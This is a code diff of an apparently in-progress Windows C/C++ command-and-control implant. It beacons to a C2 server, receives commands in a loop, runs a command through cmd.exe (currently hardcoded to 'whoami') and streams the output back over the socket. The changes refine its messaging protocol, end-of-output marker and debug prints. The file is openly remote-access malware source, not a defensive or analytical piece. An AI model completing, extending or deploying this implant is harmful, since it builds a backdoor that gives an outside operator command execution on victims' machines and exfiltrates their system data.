@@ -2,6 +2,7 @@
 #include <WinSock2.h>
 #include <WS2tcpip.h>
 #include <string.h>
+#include <iostream>
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -42,7 +43,7 @@ int main(int argc, char const* argv[])
 
 	ptr = result;
 
-	const char* sendbuf = "this is a test";
+	const char sendbuf[] = "this is a test\0";
 
 	/*iResult = shutdown(ConnectSocket, SD_SEND);
 	if (iResult == SOCKET_ERROR)
@@ -83,34 +84,39 @@ int beacon_to_c2(struct addrinfo* result, struct addrinfo* ptr, const char* send
 	{
 		closesocket(ConnectSocket);
 		ConnectSocket = INVALID_SOCKET;
-	}
-
-	if (ConnectSocket == INVALID_SOCKET)
-	{
 		printf("Can't connect to c2\n");
 		return 1;
 	}
 
 	// Send initial buffer
+	printf("Beaconing to c2...\n");
+	fflush(stdout);
+	//printf();
 	iResult = send_message_to_c2(ConnectSocket, sendbuf);
 	if (iResult != 0)
 	{
 		printf("Send failed with code %d\n", WSAGetLastError());
 		return 1;
 	}
+	iResult = send_message_to_c2(ConnectSocket, "\xff");
+	if (iResult != 0)
+	{
+		printf("Send failed with code %d\n", WSAGetLastError());
+		return 1;
+	}
 
-	/*printf("Bytes sent: %ld\n", iResult);
-	printf("Message sent: %s\n", sendbuf);
-	int bytesReceived = 0;*/
+	//printf("Bytes sent: %ld\n", iResult);
+	//printf("Message sent: %s\n", sendbuf);
+	//int bytesReceived = 0;
 	do {
-		//ZeroMemory(recvbuffer, BUFLEN);
 		char recvbuffer[BUFLEN];
-		// printf("Size of buffer: %ld\n", BUFLEN);
+		ZeroMemory(recvbuffer, BUFLEN);
+		//printf("Size of buffer: %ld\n", BUFLEN);
 		iResult = recv(ConnectSocket, recvbuffer, BUFLEN, 0);
 		if (iResult > 0)
 		{
 			//printf("Bytes recieved: %d\n", iResult);
-			//printf("String recieved: %s\n", recvbuffer);
+			printf("Command recieved: %s\n", recvbuffer);
 			if (strcmp(recvbuffer, "quit") == 0)
 				return 2;
 			else
@@ -132,19 +138,19 @@ int beacon_to_c2(struct addrinfo* result, struct addrinfo* ptr, const char* send
 
 int send_message_to_c2(SOCKET ConnectSocket, const char* buffer)
 {
-	//printf("\n------\nsending: %s\nsize: %d\n------\n", buffer, (int)strlen(buffer));
+	int bufLen = (int)strlen(buffer) + 1;
+	//printf("\n------\nsending: %s\nsize: %d\n------\n", buffer, bufLen);
+	//int dataStart = 0;
+	//while (dataStart < bufLen) {
+	//	int dataSize = bufLen > 1024 ? min(bufLen - dataStart, 1024) : bufLen;
+	//	char data[dataSize];
+	//	memcpy(&data, &buffer[dataStart], );
+	//buffer[bufLen] = '\0';
 	int iResult;
-	size_t bufSize = strlen(buffer);
-	char bufSizeBuf[sizeof(bufSize)];
-	//printf("size of buffer: %d\n", (int)bufSize);
-	sprintf_s(bufSizeBuf, "%d", (int)bufSize);
-	//printf("bufSizeBuf: %s\n", bufSizeBuf);
-	iResult = send(ConnectSocket, bufSizeBuf, sizeof(bufSizeBuf), 0);
+	iResult = send(ConnectSocket, buffer, bufLen, 0);
 	if (iResult == SOCKET_ERROR)
 		return 1;
-	iResult = send(ConnectSocket, buffer, (int)strlen(buffer), 0);
-	if (iResult == SOCKET_ERROR)
-		return 1;
+	//}
 	return 0;
 }
 
@@ -177,6 +183,7 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 	wchar_t wCmd[996];
 	mbstowcs_s(NULL, wCmd, cmd, strlen(cmd) + 1);
 	wcsncat_s(cmdLine, wCmd, 1024);*/
+	printf("Running command: whoami\n");
 	TCHAR cmdLine[] = TEXT("C:\\Windows\\System32\\cmd.exe /c whoami");
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
@@ -223,7 +230,7 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
 
 	ZeroMemory(&chBuf, sizeof(chBuf));
-
+	printf("Output:\n");
 	for (;;)
 	{
 		cSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, 4096, &dwRead, NULL);
@@ -234,7 +241,7 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 		}
 		else
 		{
-			printf("sending output...\n");
+			//printf("sending output...\n");
 			if (send_message_to_c2(ConnectSocket, chBuf) != 0)
 				printf("Error sending message, code %d\n", WSAGetLastError());
 		}
@@ -247,13 +254,13 @@ int execute_command(const char* cmd, SOCKET ConnectSocket)
 		}
 		else
 		{
-			printf("zeroing chBuf...\n");
+			//printf("\nzeroing chBuf...\n");
 			ZeroMemory(&chBuf, sizeof(chBuf));
 		}
 	}
 
-	printf("child process is done");
-	send_message_to_c2(ConnectSocket, "eof");
+	printf("child process is done\n");
+	send_message_to_c2(ConnectSocket, "\xff");
 
 	return 0;
 }
